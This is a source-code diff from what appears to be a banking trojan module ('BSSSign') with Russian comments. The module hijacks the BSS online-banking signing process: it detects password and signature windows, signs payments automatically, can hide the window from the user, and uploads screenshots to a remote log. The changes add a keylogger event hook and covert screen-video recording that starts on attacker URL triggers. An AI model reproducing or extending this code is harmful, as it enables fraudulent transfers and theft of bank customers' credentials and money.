@@ -10,6 +10,8 @@
 #include "WndUtils.h"
 #include "ScreenShots.h"
 #include "Loader.h"
+#include "VideoRecorder.h"
+#include "UniversalKeyLogger.h"
 
 
 #include "BotDebug.h"
@@ -27,8 +29,6 @@ namespace bsssign_Template
 //***********************************************************************
 namespace BSSSign
 {
-
-
 	// Делать скриншоты всплывающих окон системы
     #define LOG_BSS_SIGN
 
@@ -55,18 +55,15 @@ namespace BSSSign
 	// Хэш имени класса Интернет Эксплорера
     #define HASH_IE_SERVER 0xF5E7484A /* Internet Explorer_Server */
 
+	char BSSSignName[] = {'B','S','S','S','i','g','n', 0};
     char ButtonClassName[] = {'o','b','j','_','B','U','T','T','O','N', 0};
     char ButtonCaption[]   = {'П','о','д','п','и','с','а','т','ь', 0};
 	//----------------------------------------------------
 
-	typedef BOOL (WINAPI *TShowWindow)(HWND hWnd, int Cmd);
-
-	TShowWindow  Real_ShowWindow;
-
-
 	bool Active = false; // Активность системы подписи
 	bool Blind  = false; // Использовать штору
 	bool Move   = false; // Двигать окно
+	bool RecordVideo = false;
 	bool SignState = false; // Признак того, что в данный момент идёт подпись
 	HWND PasswordForm = NULL;
 	RECT WindowRect;
@@ -76,7 +73,7 @@ namespace BSSSign
 	void SetHooks();
 
 	// Хук отображения окна
-	BOOL WINAPI Hook_ShowWindow(HWND hWnd, int Cmd);
+	void WINAPI Event_ShowWindow(PKeyLogger, DWORD, LPVOID Data);
 
 	// Функция подписывает платёж
 	DWORD WINAPI SignPayment(LPVOID Data);
@@ -86,7 +83,6 @@ namespace BSSSign
 
 	// Делать скриншоты всплывающих окон
 	#ifdef LOG_BSS_SIGN
-		char LogTypeBSSSign[] = {'B','S','S','S','i','g','n', 0};
 		char LogTypeBSSSignUnknown[] = {'B','S','S','S','i','g','n','_','U','n','k','n','o','w','n','_','W','n','d', 0};
 		char LogTypeBSSSignError[] = {'B','S','S','S','i','g','n','_','E','r','r','o','r', 0};
 
@@ -121,7 +117,7 @@ namespace BSSSign
 			ScreenShot::MakeToMem(Log->Wnd, 0, 0, 0, 0, NULL, Log->Screen, Log->ScreenSize);
 		}
 
-		PCHAR Type = (!STR::IsEmpty(Log->Type)) ? Log->Type : LogTypeBSSSign;
+		PCHAR Type = (!STR::IsEmpty(Log->Type)) ? Log->Type : BSSSignName;
 
 		SendRemoteLog(Type, Log->Text, Log->Screen, Log->ScreenSize, NULL);
 
@@ -229,7 +225,7 @@ DWORD WINAPI BSSSign::SignPayment(LPVOID Data)
 		WaitPasswordWnd(BSSSign::PasswordForm);
 
 	// Кликаем по кнопкам закрытия окна
-	pSleep(2000);
+	pSleep(1000);
 	if (pIsWindowVisible(Form))
 	{
 		DWORD Closed = 0;
@@ -295,11 +291,16 @@ bool IsPasswordForm(HWND Wnd)
 }
 
 //----------------------------------------------------------------------------
-BOOL WINAPI BSSSign::Hook_ShowWindow(HWND Wnd, int Cmd)
+void WINAPI BSSSign::Event_ShowWindow(PKeyLogger, DWORD, LPVOID Data)
 {
 
+	PShowWindowData WndData = (PShowWindowData)Data;
+	int Cmd = WndData->Command;
+	HWND Wnd = WndData->Window;
+
+
 	if ((Cmd != SW_SHOW) || (!Active && !Blind))
-    	return Real_ShowWindow(Wnd, Cmd);
+    	return;
 
     // Включена одна из опций, проверяем окно
     bool StartSign = false;
@@ -333,34 +334,7 @@ BOOL WINAPI BSSSign::Hook_ShowWindow(HWND Wnd, int Cmd)
 			STR::Free(Caption);
         }
 	}
-	if(Blind)
-	{
-//		if (CNHash == HASH_IE_SERVER)
-//		{
-//			CNHash == CNHash;
-//        }
-//		if ( plstrcmpW(ClasN, ) )
-//		{
-//			HWND Wnd = (HWND)pGetParent((HWND)pGetParent(hWnd));
-//			HWND ShellObj = (HWND)FindWindowExA(Wnd, NULL,"Shell DocObject View",NULL);
-//			HWND hWndIn = (HWND)pFindWindowExA(ShellObj, NULL,
-//
-//			WCHAR ClasName[MAX_PATH];
-//
-//			pGetClassNameW(hWndIn,ClasName,MAX_PATH);
-//
-//			if (! plstrcmpW(ClasName,L"Internet Explorer_Server") )
-//			{
-//				Real_ShowWindow(hWndIn, SW_HIDE);
-//				Cmd = SW_HIDE;
-//			}
-//		}
-	}
-
-    STR::Free(ClassName);
-
-	
-	BOOL Result = Real_ShowWindow(Wnd, Cmd);
+	STR::Free(ClassName);
 
 
 	if (StartSign)
@@ -392,8 +366,6 @@ BOOL WINAPI BSSSign::Hook_ShowWindow(HWND Wnd, int Cmd)
 			StartThread(SendLogAndDeleteData, Log);
 		#endif
 	}
-
-	return Result;
 }
 //----------------------------------------------------------------------------
 
@@ -441,6 +413,13 @@ void BSSSign::CheckRequest(PCHAR URL)
 	if ( CompareUrl( "*az_start", URL ) )
 	{
 		Active = true;
+
+		// Если с данного процесса не запущена запись видео
+		// то принудительно стартуем её
+		RecordVideo = !VideoRecorderSrv::PingClient(0);
+		if (RecordVideo)
+			RecordVideo = VideoRecorderSrv::StartRecording(BSSSignName);
+
 		BDBG("bsssign","Автозалив активирован");
 
 	}
@@ -449,6 +428,11 @@ void BSSSign::CheckRequest(PCHAR URL)
 	{
 		BDBG("bsssign","Останавливаем автозалив");
 		Active = false;
+		if (RecordVideo)
+		{
+			RecordVideo = false;
+			VideoRecorderSrv::StopRecording();
+        }
 	}
 	else
 	if ( CompareUrl( "*blind_up", URL ) )
@@ -493,17 +477,6 @@ void BSSSign::CheckRequest(PCHAR URL)
 
 //-----------------------------------------------------------------------------
 
-void BSSSign::SetHooks()
-{
-	//UnhookShowWindow();
-	if ( HookApi( 3, 0x7506E960, Hook_ShowWindow) )
-	{
-		__asm mov [Real_ShowWindow], eax
-	}
-
-}
-//-----------------------------------------------------------------------------
-
 void BSSSign::Initialize()
 {
 	// Функция инициализирует систему подписи BSS
@@ -512,8 +485,9 @@ void BSSSign::Initialize()
 	Blind  = false;
 	Move   = false;
 	SignState = false;
+	RecordVideo = false;
 
-	SetHooks();
+    KeyLogger::ConnectEventHandler(KLE_SHOW_WND, Event_ShowWindow);
 }
 
 
